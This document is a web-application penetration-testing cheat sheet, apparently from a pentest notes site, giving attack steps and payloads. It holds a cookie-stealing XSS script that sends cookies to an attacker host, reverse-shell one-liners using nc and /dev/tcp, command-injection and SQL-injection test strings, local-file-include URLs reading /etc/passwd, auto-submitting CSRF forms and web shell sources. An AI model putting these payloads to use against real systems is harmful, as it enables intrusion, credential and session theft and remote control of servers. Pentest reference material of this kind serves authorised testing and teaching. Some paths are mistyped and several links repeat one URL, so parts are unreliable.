---
title: Attack Execution
category: Web Application
order: 4
---

> **Configuration**

Use Recon information to test for vulnerabilities in:
* OS (e.g., Shellshock)
* Webserver (e.g., heartbleed)
* Application Server Misconfiguration (e.g., admin portal, phpinfo)
* FrontEnd Frameworks (e.g., jQuery, MooTools) - look at wappalizer, src, and xmlhttprequests

> **Forced Browseing and Content Discovery**

ZAP:
* Tools -> options -> forced browse and verify options
* Right click -> attack ->  forced browse

Burp (Pro only):
* Right click -> Engagement tools -> Discover Content

> **Fuzzing and Password Guessing**

Burp Fuzzing:
1. Right click on request -> send to intruder
2. Click Posistion -> select attack type based on attack (e.g., number of posistions, combination)
3. Select Posistions 
4. Click Payloads -> select appropriate payload
5. Click Options -> Verify Grep (what you are looking for)
6. Sort on the field you were grepping for

ZAP Fuzzing (best for timing based attacks):
1. Send a request that has the posistions you want to fuzz (right click on request -> tailor -> resend)
2. Right click on request -> fuzz
3. Highlight text you want to fuzz
4. Click add -> select payload
5. Repeat for number of fields to fuzz
6. Click start fuzz
7. Sort on relevant field

Fuzzing Payloads:
* fuzzdb
* jbro fuzz
* wraph

Passwords:
* [Seclist](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
* [Weakpass](https://weakpass.com/)
* [crackstation](https://crackstation.net/)
* [Hashcat Hob0Rules](https://github.com/praetorian-inc/Hob0Rules)


> **Directory Browsing**

Test for Directory Browsing:
1. Navigate to directories and look for local file references (for NGINX and Apache try www.site.com/images)
2. Google site:gov intitle:""Index of"" ""last modified""
3. CVEs for leakage based on recon

Tools:
* Google Hacking Database
* dirb
* dirbuster
* [fuzzdb](https://github.com/fuzzdb-project/fuzzdb)
* jbrofuzz
* wmap
* Nikto
* w3af
* ZAP
* Metasploit WMAP
* Metasploit msfcrawler

> **Username Harvesting**

1. Use company website, email, google, linked-in, Facebook, Twitter to find potential usernames 
2. Find Lists:
	* [SkullSecurity](https://downloads.skullsecurity.org/passwords/):ron facebook usernames census
	* [SecList](https://github.com/danielmiessler/SecLists/tree/master/Usernames) 
3. Test a valid username vs invalid in login, password reset, create user pages:
	* Look for different HTML 
	* Look for different response variables
	* Look for differences in the url
	* Look for differences in form fields (e.g., Username field)
	* Look for iming differences in response time [calculating hashin](https://littlemaninmyhead.wordpress.com/2015/07/26/account-enumeration-via-timing-attacks/) 
4. Fuzz using Burp or Zap

> **Assess Authentication**

Analyze authentication (valid and invalid) in proxy for multiple users:
1. Is it form based, basic, digest?
2. Are they using cookies? What is in the cookie? URI paramters?  Hidden form fields?
3. Any other interesting fields
4. Is the cookie marked as secure or HTTP only? 
	* set-cookie: [values]; HttpOnly; Secure
	* If yes, is the value located in the HTML anywhere (e.g., hidden form field)? 
5. Look for:
	* Session Fixation
	* Session Randomness
	* Predictability
	* Bruteforece 

> **Break OAUTH 1.0**

* Find secret key:
	* Insecure storage of key
	* Intercept the generation of request and access token
	* JavaScript information leak
	* Spoof the site

> **Session Fixation**

1. Get a session token from site 
2. Document session token
3. Log-in 
3. Document session token
4. Did it change using burp compare?  If not, session fixation may be possible.
	* Note: If there are a bunch, just start deleting some of them, the ones that causes a logout would be the session token.
5. Can you set the session via URL, hidden form fields, or XSS

> **Session Predictability**

1. Get a lot of session tokens (script or burp sequencer to gather tokens)
2. Use burp sequencer to analyze
3. Known hashes may look non-predictable, but may just be a hash of incrimenting or static values (e.g., 1..9, username)

Using Burp Sequencer:
1. Right click on login request -> send to sequencer 
2. In token locaiton within response -> select the token
3. Look for the red results
	* Note: If it doesn't work use a script and load a file into burp instead.

> **Authentication Bypass**

Blackbox
1. Forced browsing (see ZAP forced browsing or Burp Burp Discovery)
2. Look at keys and ids in url and cookies (e.g., Admin=true)

Whitebox
1. Spider at each authentication level as separate sitemaps (saved)
2. Attempt to access with a lower level (not just pages, but functions - javascript -forms)

> **Command Injection**

Prefixs before attack payload (command seperator): 
&, &&, ||,  <, >, ;, $()

Test Visable:
; ls /ect/passwd or /ect/hosts

Test Blind:
; ping y.o.ur.ip 
on your attack system "sudo tcpdump -n host [victimIP] and icmp"
; nslookup (you need a public facing system to see nslookup)

> **SQL Injection: Test Strings**

{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

> **SQL Injection: Database Identification**

Oracle | ORA-01756: quoted string not properly terminated
MS SQL Server | Incorrect syntax near 'something'
PostgreSQL | 5-digit Hex Error Code

> **CSRF**

GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

> **XSS**

Get Cookie:
{% highlight html %}
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}


> **XSS Test Strings**

{% highlight html %}
'';!--"<XSS>=&{()}
{% endhighlight %}

{% highlight html %}
<script>alert(document.cookie);</script>

<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>

<script src=http://www.example.com/malicious-code.js></script>

%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e

\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e

>"><script>alert("XSS")</script>&

"><STYLE>@import"javascript:alert('XSS')";</STYLE>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')> 

<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>

<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">

{% endhighlight %}



> **Local File Include**

{% highlight bash %}
#Automated Tool
fimap -u 'http://website/?p=file.html'

#Test for Local File Include
http://website/?p=file%3a%2f%2f%2fetc%2fpasswd

#Grab data
http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php

#Rebuild Base64 file (e.g.,executable)
base64 -d extractedBase64File > executable2
curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d

{% endhighlight %}

> **Command Injection**
{% highlight bash %}
#Commix Automated Tool
commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"


#Test Strings
test`pwd`
test$(pwd)
test; pwd
test | pwd
test && pwd
{% endhighlight %}

> **Blind Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 

#Sleep method
http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
{% endhighlight %}

> **Web Shells**

Kali: 

PHP | <code> /usr/share/webshells/php/ </code>
PERL | <code> /usr/share/webshells/perl/ </code>
Cold Fusion | <code> /usr/share/webshells/cfm/ </code>
ASP | <code> /usr/share/webshells/asp/ </code>
ASPX | <code> /usr/share/webshells/aspx/ </code>
JSP | <code> /usr/share/webshells/jsp/jsp-reverse.jsp </code>

Online:

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **Useful Resources**

* [MongoDB](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Command Injection](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [Fuzzing List](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
* [XSS, SQL, LDAP, XPATH, XML Injection Test Strings](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors)
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)

> **Useful Tools**
* [SQLMap](http://sqlmap.org)

